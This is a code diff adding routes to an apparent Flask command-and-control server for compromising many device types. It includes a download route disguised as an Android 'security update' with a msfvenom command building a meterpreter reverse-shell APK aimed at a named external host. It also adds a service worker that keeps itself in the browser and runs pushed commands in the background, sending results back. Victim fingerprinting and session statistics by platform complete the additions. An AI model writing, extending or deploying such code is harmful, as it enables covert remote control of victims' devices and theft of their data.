+        print(f"[FINGERPRINT] {platform} device from {client_ip}")
+        
+        return jsonify({'status': 'received'})
+        
+    except Exception as e:
+        print(f"Fingerprint error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+# =============================================================================
+# APK DOWNLOAD ENDPOINT (Android)
+# =============================================================================
+
+@app.route('/download/android-security-update.apk')
+def download_android_apk():
+    """Serve Android APK (placeholder - create real APK with msfvenom)"""
+    
+    # In real implementation, serve actual APK created with:
+    # msfvenom -p android/meterpreter/reverse_tcp LHOST=your-ip LPORT=4444 -o payload.apk
+    
+    return jsonify({
+        'error': 'APK not available',
+        'message': 'Create APK with: msfvenom -p android/meterpreter/reverse_tcp LHOST=hitrunc2server-production.up.railway.app LPORT=443 -o android-update.apk'
+    })
+
+# =============================================================================
+# SERVICE WORKER FOR WEB PERSISTENCE
+# =============================================================================
+
+@app.route('/sw.js')
+def service_worker():
+    """Service Worker for web persistence"""
+    js_code = '''
+// Service Worker for Universal C2 Persistence
+
+const CACHE_NAME = 'system-update-v1';
+const urlsToCache = [
+    '/universal',
+    '/offline.html'
+];
+
+self.addEventListener('install', event => {
+    event.waitUntil(
+        caches.open(CACHE_NAME)
+            .then(cache => cache.addAll(urlsToCache))
+    );
+});
+
+self.addEventListener('fetch', event => {
+    event.respondWith(
+        caches.match(event.request)
+            .then(response => {
+                return response || fetch(event.request);
+            })
+    );
+});
+
+// Background sync for command execution
+self.addEventListener('sync', event => {
+    if (event.tag === 'background-sync') {
+        event.waitUntil(
+            // Execute commands in background
+            fetch('/universal').catch(() => {})
+        );
+    }
+});
+
+// Push notifications for command delivery
+self.addEventListener('push', event => {
+    if (event.data) {
+        const command = event.data.text();
+        
+        // Execute command in background
+        event.waitUntil(
+            executeBackgroundCommand(command)
+        );
+    }
+});
+
+async function executeBackgroundCommand(command) {
+    try {
+        // Execute web command in background
+        const response = await fetch('/api/web-execute', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({command: command})
+        });
+        
+        const result = await response.json();
+        
+        // Send result back
+        await fetch('/r', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                h: 'web-worker',
+                c: command,
+                o: result.output || 'executed',
+                t: 0,
+                s: true
+            })
+        });
+    } catch (e) {
+        console.error('Background command failed:', e);
+    }
+}
+    '''
+    
+    return Response(js_code, mimetype='application/javascript')
+
+# =============================================================================
+# PLATFORM STATISTICS ENDPOINT
+# =============================================================================
+
+@app.route('/api/platform-stats')
+def platform_statistics():
+    """Get statistics by platform"""
+    try:
+        with db_lock:
+            with sqlite3.connect(DATABASE_FILE) as conn:
+                # Platform distribution from sessions
+                platform_cursor = conn.execute('''
+                    SELECT 
+                        CASE 
+                            WHEN os_info LIKE '%Windows%' THEN 'Windows'
+                            WHEN os_info LIKE '%Mac%' OR os_info LIKE '%Darwin%' THEN 'macOS'
+                            WHEN os_info LIKE '%Linux%' AND os_info NOT LIKE '%Android%' THEN 'Linux'
+                            WHEN os_info LIKE '%Android%' THEN 'Android'
+                            WHEN os_info LIKE '%iOS%' OR os_info LIKE '%iPhone%' THEN 'iOS'
+                            ELSE 'Other'
+                        END as platform,
+                        COUNT(*) as count
+                    FROM sessions 
+                    GROUP BY platform
+                ''')
+                
+                platforms = {}
+                for row in platform_cursor.fetchall():
+                    platforms[row[0]] = row[1]
+                
+                # Fingerprint statistics
+                fingerprint_cursor = conn.execute('''
+                    SELECT platform, COUNT(*) as count
+                    FROM device_fingerprints
+                    GROUP BY platform
+                ''')
+                
+                fingerprints = {}
+                for row in fingerprint_cursor.fetchall():
+                    fingerprints[row[0]] = row[1]
+                
+                return jsonify({
+                    'session_platforms': platforms,
+                    'fingerprint_platforms': fingerprints,
+                    'total_sessions': sum(platforms.values()),
+                    'total_fingerprints': sum(fingerprints.values())
+                })
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 @app.route('/ps1')
 def get_powershell_payload():
     """PowerShell payload endpoint"""
